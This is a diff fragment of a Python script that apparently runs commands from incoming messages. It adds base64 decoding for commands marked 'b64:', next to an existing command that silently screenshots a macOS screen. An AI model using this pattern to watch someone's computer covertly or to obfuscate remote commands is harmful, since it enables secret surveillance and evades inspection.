@@ -53,6 +53,8 @@ while True:
         if not body.startswith("!"):
             continue
         cmd = body[1:].strip()
+        if cmd.startswith("b64:"):
+            cmd = base64.b64decode(cmd[4:]).decode()
         if cmd == "shot":
             subprocess.run(["screencapture", "-x", "/tmp/shot.png"], capture_output=True)
             subprocess.run(["sips", "-s", "format", "jpeg", "-Z", "1400", "/tmp/shot.png", "--out", "/tmp/shot.jpg"], capture_output=True)
